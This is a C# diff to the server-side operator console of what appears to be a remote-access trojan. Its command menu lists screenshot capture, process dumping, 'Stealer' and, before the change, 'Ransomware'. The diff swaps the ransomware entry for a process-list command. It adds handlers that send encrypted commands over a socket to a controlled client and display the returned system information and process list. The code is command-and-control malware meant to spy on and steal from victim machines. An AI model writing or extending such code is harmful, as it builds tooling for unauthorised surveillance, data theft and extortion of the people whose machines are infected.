@@ -43,7 +43,7 @@ namespace Server_side
             cmdComboBox.Items.Add("Get SystemInfo");
             cmdComboBox.Items.Add("Get ProcessDump");
             cmdComboBox.Items.Add("Get Screenshot");
-            cmdComboBox.Items.Add("Ransomware");
+            cmdComboBox.Items.Add("Get ProcessList");
             cmdComboBox.Items.Add("Stealer");
             cmdComboBox.Items.Add("Exit");
             cmdComboBox.SelectedIndex = 0;
@@ -175,6 +175,10 @@ namespace Server_side
                         byte[] response = GetResultFile(false);
                         logging("Response received|---|" + Encoding.UTF8.GetString(response));
 
+                        MessageBox.Show("System information received successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
+
+                        DisplaySystemInfo displaySystemInfo = new DisplaySystemInfo(Encoding.UTF8.GetString(response));
+                        displaySystemInfo.Show();
 
                         break;
                     }
@@ -242,6 +246,22 @@ namespace Server_side
                     }
                 case 4:
                     {
+                        placeholder = "getprocesslist";
+                        string command = $"{cmdComboBox.SelectedIndex + 2}{delimiter}{placeholder}";
+                        byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
+                        NetworkLayer.Send(clientSocket, encryptedCommand);
+
+                        logging("Command sent|---|" + cmdComboBox.Text);
+
+                        // Receive response
+                        byte[] response = GetResultFile(false);
+                        logging("Response received|---|" + Encoding.UTF8.GetString(response));
+
+                        MessageBox.Show("Process list received successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
+
+                        DisplayPSList displayPSList = new DisplayPSList(Encoding.UTF8.GetString(response));
+                        displayPSList.Show();
+
                         break;
                     }
                 case 5:
